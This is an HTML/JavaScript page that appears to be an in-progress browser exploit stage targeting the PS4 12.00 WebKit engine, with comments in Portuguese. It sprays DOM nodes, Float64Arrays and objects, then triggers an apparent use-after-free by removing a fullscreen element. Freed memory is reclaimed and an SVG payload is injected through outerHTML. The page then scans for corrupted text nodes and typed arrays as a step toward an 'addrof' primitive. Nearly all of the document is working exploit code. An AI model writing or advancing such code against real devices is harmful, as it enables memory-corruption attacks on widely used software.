<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF DOM Overlap Stage (JSC Scan)</title>
</head>
<body style="background:#111;color:#0f0;font-family:monospace;">

<h2>UAF → Type Confusion → JSC Overlap Scan</h2>
<button onclick="runTest()">Run Test</button>

<script>

// ==========================
// 🔒 SAFE LOG
let logBuffer = [];
function log(msg){
    try { console.log(msg); } catch(e){}
    logBuffer.push(msg);
}

// ==========================
// 🌍 DOM SPRAY (MESMA ARENA)
let dom_spray = [];

function setupDOMSpray(){
    log("[*] Setup DOM spray");

    dom_spray = [];

    // 🔥 TextNodes
    for(let i=0;i<6000;i++){
        let t = document.createTextNode("TXT_" + i);
        document.body.appendChild(t);
        dom_spray.push(t);
    }

    // 🔥 Elements
    for(let i=0;i<6000;i++){
        let d = document.createElement("div");
        d.innerHTML = "EL_" + i;
        document.body.appendChild(d);
        dom_spray.push(d);
    }

    // 🔥 Attributes
    for(let i=0;i<6000;i++){
        let d = document.createElement("div");
        d.setAttribute("data-x", "ATTR_" + i);
        document.body.appendChild(d);
        dom_spray.push(d);
    }

    window.dom_spray = dom_spray;

    log("[*] DOM spray pronto: " + dom_spray.length);
}

// ==========================
// HEAP SETUP (100% INALTERADO)
function setupHeap(){
    let arr=[];
    for(let i=0;i<5000;i++){
        let a=new Float64Array(8);
        a[0]=i;
        arr.push(a);
    }
    return arr;
}

// ==========================
// FULLSCREEN (100% INALTERADO)
function setupFullscreen(){
    let fsTarget=document.createElement("div");

    fsTarget.innerHTML="<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    Object.assign(fsTarget.style,{
        background:"black",
        width:"100%",
        height:"100%",
        position:"absolute",
        top:"0",
        left:"0"
    });

    document.body.appendChild(fsTarget);
    fsTarget.webkitRequestFullscreen?.();

    return fsTarget;
}

// ==========================
// 💣 RECLAIM (100% INALTERADO)
function reclaim(size){
    log("[*] Reclaim size = " + size);

    for(let i=0;i<3000;i++){
        let e=document.createElement("div");
        document.body.appendChild(e);
        e.remove();
    }

    for(let i=0;i<size;i++){
        let e=document.createElement("div");
        e.innerHTML="<h1>CONTROL_"+i+"</h1>";
        document.body.appendChild(e);
    }
}

// ==========================
// 💥 SVG CONFUSION (MANTIDO)
function inject(child){
    try{
        child.outerHTML = `
        <svg>
            <foreignObject width="100%" height="100%">
                <div xmlns="http://www.w3.org/1999/xhtml">
                    AAAA
                </div>
            </foreignObject>
        </svg>`;
        log("[*] payload injected");
    }catch(e){
        log("[UAF] inject crash");
    }
}

// ==========================
// 🔬 DOM & HEAP OVERLAP PROBE
function domOverlapProbe(fsTarget){
    log("---- OVERLAP PROBE ----");

    try{
        let n = fsTarget.firstChild;

        if(!n){
            log("[!] no node");
            return;
        }

        log("[CHECK] nodeType = " + n.nodeType);

        if(n.nodeType === 3){

            log("[!!!] TEXTNODE CONFUSION");

            // 💣 WRITE PRIMITIVA (MANTIDA)
            try{
                n.data = "A".repeat(0x200);
                log("[PWN] write expand OK");
            }catch(e){
                log("[UAF] write crash");
            }

            // ==========================
            // 🔥 SCAN DOM & JSC HEAP
            try{

                // 1. SCAN DO DOM (Original)
                for(let i=0;i<dom_spray.length;i++){
                    let obj = dom_spray[i];

                    // 🔥 TextNode corrupção
                    if(obj.nodeType === 3){
                        if(!obj.data || !obj.data.includes("TXT_")){
                            log("[!!!] TEXTNODE CORROMPIDO @ " + i);
                            return;
                        }
                    }

                    // 🔥 Element overlap
                    if(obj.nodeType === 1){
                        let html = obj.innerHTML;
                        if(html && html.includes("AAAA")){
                            log("[!!!] ELEMENT OVERLAP @ " + i);
                            return;
                        }
                    }
                }
                log("[SCAN] nenhum overlap no DOM");

                // 2. SCAN DO JSC HEAP (O NOVO ALVO!)
                if(window.heap_spray){
                    for(let i=0; i<window.heap_spray.length; i++){
                        // Originalmente a[0] = i. Se mudou, nossos "A"s atingiram o alvo!
                        if(window.heap_spray[i][0] !== i){
                            log("[$$$] JACKPOT! FLOAT64ARRAY CORROMPIDO @ " + i);
                            log("[$$$] Valor atual: " + window.heap_spray[i][0]);
                            return; // Encerra, achamos o caminho para o addrof!
                        }
                    }
                    log("[SCAN] Float64Array intacto");
                }

            }catch(e){
                log("[UAF] scan crash");
            }

        } else {
            log("[INFO] nao virou TextNode");
        }

    }catch(e){
        log("[UAF] probe crash geral");
    }
}

// ==========================
// TRIGGER (100% INALTERADO)
function trigger(fsTarget){
    log("[*] Trigger");

    try{
        fsTarget.remove();

        if(document.webkitIsFullScreen || document.fullscreenElement){
            document.webkitExitFullscreen?.();
        }

    }catch(e){
        log("[ERRO]");
    }

    let sizes=[1500,2000,2500,3000];

    sizes.forEach((s,i)=>{
        setTimeout(()=>reclaim(s), i*50);
    });

    setTimeout(()=>{
        try{
            let child = fsTarget.firstChild;
            if(child) inject(child);
        }catch(e){}
    }, 30);

    setTimeout(()=>domOverlapProbe(fsTarget), 80);
    setTimeout(()=>domOverlapProbe(fsTarget), 160);
    setTimeout(()=>domOverlapProbe(fsTarget), 240);

    setTimeout(()=>{
        alert(logBuffer.join("\n"));
    }, 400);

    // ⚠️ CRÍTICO
    setTimeout(()=>location.reload(), 500);
}

// ==========================
// MAIN (AJUSTADO APENAS PARA VARIÁVEIS GLOBAIS)
function runTest(){
    log("[*] Iniciando teste");

    setupDOMSpray(); 

    // Guardamos na window para o Scanner conseguir ver sem mudar a função original
    window.heap_spray = setupHeap(); 

    // Injetamos o Array de Objetos para o Heap Feng Shui parear com o FloatArray
    window.obj_spray = [];
    for(let i=0; i<5000; i++){
        window.obj_spray.push({ pwn_id: i, pwn_val: 0x1337 });
    }
    log("[*] Array de Objetos pronto: " + window.obj_spray.length);

    let fsTarget=setupFullscreen();

    window.onblur=function(){
        log("[*] onblur");
        setTimeout(()=>trigger(fsTarget), 3000);
    };
}

</script>

</body>
</html>
